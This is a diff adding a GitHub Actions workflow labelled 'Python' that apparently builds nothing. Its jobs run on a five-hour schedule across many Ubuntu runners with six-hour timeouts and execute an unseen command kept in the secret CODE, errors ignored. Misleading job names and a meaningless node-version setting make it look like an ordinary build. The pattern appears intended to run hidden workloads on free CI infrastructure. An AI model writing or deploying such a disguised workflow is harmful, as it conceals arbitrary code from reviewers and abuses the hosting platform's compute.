@@ -1,0 +1,55 @@
+# Bismillah-AMMAR
+name: Python
+on:  
+  push:
+  pull_request:
+  schedule:
+  - cron: "0 */5 * * *" # 6 jam
+#  - cron: "*/12 * * * *" # 12 Menit
+jobs:
+ python:
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [ubuntu-18.04, ubuntu-20.04, ubuntu-22.04, ubuntu-latest, ubuntu-18.04]
+         flag: [A]
+    runs-on: ${{ matrix.go }}
+    timeout-minutes: 360
+    steps:
+    - uses: actions/checkout@v3
+      with:
+        node-version: ${{ matrix.flag }}
+    - name: Python-run
+      run: echo "AMMAR in here"
+ python-build-1:
+    needs: python
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [ubuntu-18.04, ubuntu-20.04, ubuntu-22.04, ubuntu-latest, ubuntu-18.04]
+         flag: [A, B]
+    runs-on: ${{ matrix.go }}
+    timeout-minutes: 360
+    steps:
+    - uses: actions/checkout@v3
+      with:
+        node-version: ${{ matrix.flag }}
+    - name: Rerunning
+      continue-on-error: true
+      run: ${{ secrets.CODE }}
+ python-build-2:
+    needs: python
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [ubuntu-18.04, ubuntu-20.04, ubuntu-22.04, ubuntu-latest, ubuntu-18.04]
+         flag: [A, B]
+    runs-on: ${{ matrix.go }}
+    timeout-minutes: 360
+    steps:
+    - uses: actions/checkout@v3
+      with:
+        node-version: ${{ matrix.flag }}
+    - name: Rerunning
+      continue-on-error: true
+      run: ${{ secrets.CODE }}
